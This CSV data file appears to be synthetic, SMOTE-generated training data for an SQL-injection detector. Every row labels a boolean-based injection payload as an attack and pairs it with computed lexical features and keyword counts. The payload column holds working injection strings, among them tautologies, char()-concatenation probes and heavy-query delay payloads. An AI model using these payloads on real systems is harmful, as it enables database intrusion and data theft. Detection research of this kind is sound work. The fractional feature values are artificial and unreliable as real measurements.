id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001025,attack,boolean,"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000051,0.5851439562823607,100.84163906447945,29.951419264423038,3.5979096501529146,28.505362274604,14.276971505090483,42.38485752545242,15.674447759332553,0.2664859358671384,0.1518294865221287,0.4244970403298692,0.15718753728086365,2.758990501696828,0.0,2.0,0.8794952508484138,0.0,0.9999999999999999,0.0,8.156466755938897,0.0,0.0,0.879495250848414,3.879495250848414,1.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001026,attack,boolean,"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000057,0.5104379756732974,154.88651103572255,33.83742392582481,4.16133918429746,75.16257607417519,16.0,47.04908710989773,16.67484785164962,0.4858473158159198,0.10340657393084039,0.3031346264819329,0.10761148377130694,0.8374239258248106,0.16257607417518938,2.0,0.0,1.0,2.0,0.0,5.674847851649621,0.0,0.0,2.0,5.0,0.8374239258248106,0.16257607417518935,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001027,attack,boolean,"1""   )    )    as wnzf where 3352  =  3352 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000030,0.8446836733106879,258.5827162911204,37.39225073456495,3.791849004560494,76.90879399278903,36.464083578188315,103.96125367282478,41.24858504731823,0.2974971565035013,0.14258408140683637,0.40119585461044993,0.15872290747921244,0.0,0.7320417890941595,2.0,0.0,0.0,2.0,0.0,22.124292523659115,0.0,1.7320417890941595,3.7320417890941595,12.928167156376638,0.0,0.7320417890941595,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,6.464083578188319,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.464083578188319
SMOTE_001028,attack,boolean,"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000057,0.731121638832721,154.43679900837927,34.96120037185778,4.137672645888174,70.35419820268741,17.121400433834072,49.64080024790518,17.32040012395259,0.453442164348985,0.11171663206296614,0.3223202099431056,0.11252099364494328,1.320400123952592,0.0,2.0,0.16020006197629588,0.839799938023704,2.0,0.0,6.480600185928888,0.0,0.0,1.839799938023704,5.160200061976296,1.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,0.839799938023704,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8397999380237042
SMOTE_001029,attack,boolean,"1'  )   as tuhc where 4018  =  4018 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000063,0.013341848052432168,268.81654690290134,37.99625605924288,3.8015327753901165,81.94384088864327,36.98128029621442,105.9288651256148,43.962560592428844,0.30483163827318566,0.13757607577347636,0.39405729548974044,0.1635349904635975,1.0037439407571158,0.0,1.9925121184857684,0.0,0.0,2.0,0.0,22.981280296214422,0.0,1.9962560592428842,3.996256059242884,13.985024236971537,1.0,0.0,0.9962560592428842,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0037439407571158156,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,6.992512118485768,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.996256059242885
SMOTE_001030,attack,boolean,"1'  )   where 6388  =  6388 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000072,1.3186015450254571,148.18332097714108,33.0,4.104415862287711,73.9583024428527,13.141623419993767,43.450037068576776,17.63335804571785,0.4990117641292211,0.08853439044627741,0.29336343711615553,0.119090408308346,1.0,0.0,2.0,0.0,1.0,1.591660488570538,0.0,5.816679022858923,0.4083395114294619,0.0,2.408339511429462,4.591660488570538,1.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.5916604885705381,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.591660488570538
SMOTE_001031,attack,boolean,"1""  )   where 2180  =  2180 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R000028,0.6843042748144951,70.71728512429172,26.0,3.8017344921669594,14.760904958569427,21.717285124291724,24.0,10.239095041430573,0.20890490611261914,0.3068780765343042,0.3394882890444224,0.1447287283086542,0.0,1.0,2.2390950414305744,0.0,0.0,2.0,0.0,3.0,0.0,1.0,1.0,4.239095041430575,0.0,1.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.7609049585694252,0.23909504143057464,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001032,attack,boolean,1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb,nearest_attack_euclidean,R000015,0.7877384493344907,79.95108827919879,17.8405101860614,2.838729432521487,11.874268674445894,12.227006790707597,42.58904753495319,13.260765279092096,0.14075115344776248,0.16230013553628644,0.5319772048959782,0.1649715061199728,3.4202550930306987,0.0,0.0,0.0,0.8067516976768996,1.8067516976768996,0.0,7.033758488384498,0.19324830232310042,0.0,0.0,2.613503395353799,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.8067516976768996,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8067516976768996
SMOTE_001033,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000016,0.1266438775382597,253.71918026443427,36.036594849587594,3.798442255184965,81.45107725618611,29.10978454876278,99.5242669553613,43.63405150412407,0.3209456669989991,0.11488661020081845,0.39227754094783784,0.1718901818523446,3.926810300824814,0.0,0.0,0.0,0.0,2.0,0.0,21.85362060164963,0.0,1.9634051504124073,3.9634051504124073,11.926810300824814,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.03659484958759285,0.0,0.03659484958759285,0.0,0.9634051504124072,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,6.926810300824815,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.963405150412408
SMOTE_001034,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000021,1.2266991052154732,211.73702967091396,34.689000899118604,3.778712148329185,64.30151213810116,25.722502247796513,84.26801078942326,37.445004495593025,0.3015343741508632,0.12241652065010075,0.3986853363255843,0.17736376887345173,4.0,0.0,0.0,0.0,0.0,2.0,0.0,18.067002697355814,1.3109991008813953,1.3445004495593023,3.3445004495593027,9.378001798237209,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,5.689000899118605,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.689000899118605
SMOTE_001035,attack,boolean,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",nearest_attack_euclidean,R000055,0.11439266631897926,54.824321064527936,21.853600887106605,3.7140821379233526,13.79504124194925,17.087839467736035,17.94144035484264,6.0,0.2512752405951086,0.3119917301033422,0.32725099827637943,0.10948203102516973,0.0,0.9707201774213212,2.029279822578679,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,4.029279822578679,0.0,0.9707201774213212,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.9707201774213212,0.02927982257867867,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001036,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000073,0.7750792081859659,121.04170428700552,29.483336342960442,4.100034583101985,67.86669074368353,7.033327314079118,32.93334537184177,13.208340857401103,0.5601242460344877,0.059658323405158656,0.2717417319791697,0.10847569858118389,0.0,1.483336342960441,0.0,0.0,1.0,0.9999999999999999,0.0,4.241668171480221,0.0,0.0,2.2416681714802205,2.0,0.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.24166817148022046,0.7583318285197795,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001037,attack,boolean,"-8327 where 7555  =  7555 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000035,0.8733171893246771,374.44336431468565,31.0,3.3938447467847603,95.55566356853143,58.0,169.44336431468565,51.444336431468564,0.2553640509088483,0.15497078911814438,0.4522584177720759,0.1374067422009314,0.0,0.0,2.5556635685314353,0.0,0.0,3.0,0.0,34.88867286293713,0.0,0.0,1.0,15.555663568531436,0.0,0.0,0.7778317842657176,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,2.0,0.0,0.7778317842657176,0.0,0.22216821573428247,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_001038,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000049,0.21187178606540924,146.05938946244927,33.0,4.070145971270042,69.84561434027863,9.256530146604748,47.085510048868244,19.871734926697627,0.4773925799285476,0.063737438170822,0.32281788693597374,0.13605209496465664,1.085510048868249,0.0,2.0,0.04275502443412446,0.9572449755658756,0.9999999999999999,0.0,7.085510048868249,0.9572449755658754,0.0,2.914489951131751,4.0,1.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.9572449755658754,0.0,0.0,0.9572449755658756,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.914489951131751
SMOTE_001039,attack,boolean,"-1617%"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R000008,1.0455478778257674,349.8524417836104,32.01348831784261,3.3307363253557423,85.87267426037428,47.48313960269674,162.9932558410787,53.503372079460654,0.2448746130542883,0.13604860620827858,0.4661530490890696,0.15292373164836348,0.0,4.0,0.8322093068464491,0.0,0.0,2.0,0.0,34.0,1.6644186136928982,0.33558138630710177,0.6711627726142038,12.83220930684645,0.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.16779069315355086,1.0,0.0,0.0,0.16779069315355088,1.0,0.8322093068464491,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,11.161046534232245,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,16.161046534232245
SMOTE_001040,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000021,1.5736646043335587,183.15466525601514,33.22062203413535,3.7403788023366897,53.830933051203026,24.0,73.66186610240605,31.661866102406055,0.2940625116340248,0.13125001623352298,0.4021875002705587,0.1724999718618935,2.8309330512030275,0.0,0.0,0.0,0.0,1.610311017067676,0.0,16.0,1.2206220341353518,1.0,3.0,7.6103110170676755,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.6103110170676759,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.610311017067676
SMOTE_001041,attack,boolean,1'   )    )    and 2832  =  4165--,nearest_attack_euclidean,R000026,1.1588062133177182,33.33208187311578,15.0,3.0670706077217997,2.77736062437193,9.66791812688422,14.664163746231559,6.222639375628074,0.08295447401261688,0.29195491409489704,0.4376359178387292,0.18745469405375695,0.7773606243719269,0.22263937562807323,2.222639375628073,0.0,0.0,0.9999999999999999,0.0,1.7773606243719264,0.22263937562807334,0.0,0.0,3.222639375628073,0.7773606243719268,0.22263937562807326,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.7773606243719267,0.22263937562807323,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001042,attack,boolean,-7770' where 6503  =  6503 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,nearest_attack_euclidean,R000031,2.776363972433738,368.99926862980925,30.416646350828035,3.311466567662637,86.99975620993641,58.0,172.74957336738873,51.2499390524841,0.23554957026418322,0.1575405071669641,0.46789416859891997,0.1390157539699327,0.5833536491719657,0.0,2.1667072983439315,0.0,0.0,2.4166463508280343,0.0,35.66658540331213,0.0,0.0,0.4166463508280345,14.583353649171965,0.5833536491719657,0.0,0.5833536491719657,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.4166463508280343,0.0,0.5833536491719657,0.0,0.41664635082803436,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4166463508280343,3.469446951953614e-18,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,17.833292701656067
SMOTE_001043,attack,boolean,-9148  )   where 2027  =  2027 or 8571  =  8571--,nearest_attack_euclidean,R000020,1.2414879883585759,50.90661949943596,18.588849582863297,3.561241982625235,9.224389416008613,19.046690250282023,16.635539833145316,6.0,0.17834832834447883,0.37668105093695736,0.3267664340753786,0.11820418664318524,0.0,0.3177699165726594,2.6822300834273407,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,4.68223008342734,0.0,0.31776991657265935,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.3177699165726594,0.6822300834273406,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001044,attack,boolean,or 'unusual'   =   'unusual',nearest_attack_euclidean,R000001,3.9016826502704585,84.37661211005958,20.716215525052647,3.615448638864385,48.61456898929067,4.193301727194516,20.977672423981716,10.591068969592685,0.5741088537725756,0.02814296461204374,0.2492182509829988,0.1485299306323819,4.0,0.0,0.0,0.0,0.46592241413272384,0.9999999999999999,0.0,1.8636896565308962,0.0,0.0,1.3977672423981717,1.4659224141327236,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,0.46592241413272384,0.0,0.0,3.469446951953614e-18,0.0,0.4659224141327238,0.0,0.0,0.46592241413272384,0.4659224141327238,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.3977672423981713
SMOTE_001045,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000021,0.20499880400804682,188.23853746964653,33.89847166261954,3.7656253345376993,54.847707493929306,24.0,75.69541498785861,33.69541498785862,0.29140355031083376,0.12753983764302387,0.40212566396071703,0.17893094808542528,3.847707493929309,0.0,0.0,0.0,0.0,1.9492358313097697,0.0,16.0,1.8984716626195393,1.0,3.0,7.949235831309769,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.9492358313097696,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.949235831309769
SMOTE_001046,attack,boolean,"1'  )   as tuhc where 4018  =  4018 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000063,1.0232772184043162,270.5193463945419,38.0,3.8024234603300715,82.30386927890838,36.392261442183234,107.8232156734503,44.0,0.3042514100843068,0.13456574107059452,0.398521074245471,0.16266177459962766,0.6961307210916176,0.0,2.0,0.0,0.0,2.0,0.0,23.30386927890838,0.0,2.0,4.0,14.0,0.6961307210916174,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.3038692789083826,0.6961307210916174,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_001047,attack,boolean,-6588' where 7793  =  7793 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R000013,1.2155754365424316,55.437292024761135,18.75562509766213,3.554051219110497,7.0,22.340833463549505,18.3408334635495,7.755625097662129,0.12753025708390203,0.40338605415602147,0.3305116215366488,0.13857206722342771,0.5852083658873762,0.0,3.0,0.0,0.5852083658873761,2.0,0.0,1.5852083658873752,0.0,0.0,0.0,5.585208365887376,0.5852083658873761,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001048,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000021,0.7055593315836463,182.65803590769355,33.40170150072581,3.7729178683132005,53.20510450217742,23.04272240116129,73.12816720348387,33.28204180087097,0.2913777145964981,0.1258668562105057,0.39975151231223705,0.18300391688075912,3.521361200580645,0.4786387994193551,0.0,0.0,0.0,2.0,0.0,15.282041800870967,2.0,1.119659699854839,2.760680600290322,8.0,0.8803403001451612,0.11965969985483887,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,1.1196596998548387,0.8803403001451612,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,4.401701500725807,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.401701500725806
SMOTE_001049,attack,boolean,"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",nearest_attack_euclidean,R000065,2.9481295256832896,371.4794702861508,30.56929000665467,3.2791257542253547,87.97006009316539,54.55432005323736,175.95509013974808,53.0,0.2365126226959013,0.1467256007106024,0.4736110481900824,0.14315072840341392,0.0,1.72283997338132,1.0,0.0,0.0,2.56929000665467,0.0,36.27716002661868,0.86141998669066,0.0,0.5692900066546702,13.56929000665467,0.0,0.43070999334533,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.56929000665467,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5692900066546701,3.469446951953614e-18,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,18.13858001330934
SMOTE_001050,attack,boolean,-7770' where 6503  =  6503 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,nearest_attack_euclidean,R000031,1.0773990525508124,340.27416999660204,31.29184282384922,3.398462734821759,82.0,54.60891258739581,154.63413952709317,49.03111788211309,0.2434578587809908,0.15959562720407444,0.4520983923838893,0.1448481216310454,1.0,0.0,2.838519647018848,0.0,0.0,2.0,0.0,32.223716117207324,0.0,0.32296070596230464,0.6459214119246093,14.838519647018849,1.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.16148035298115224,0.8385196470188477,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,11.192598235094238,0.0,0.0,0.0,0.0,0.0,0.0,0.8385196470188478,0.8385196470188478,15.708157176150781
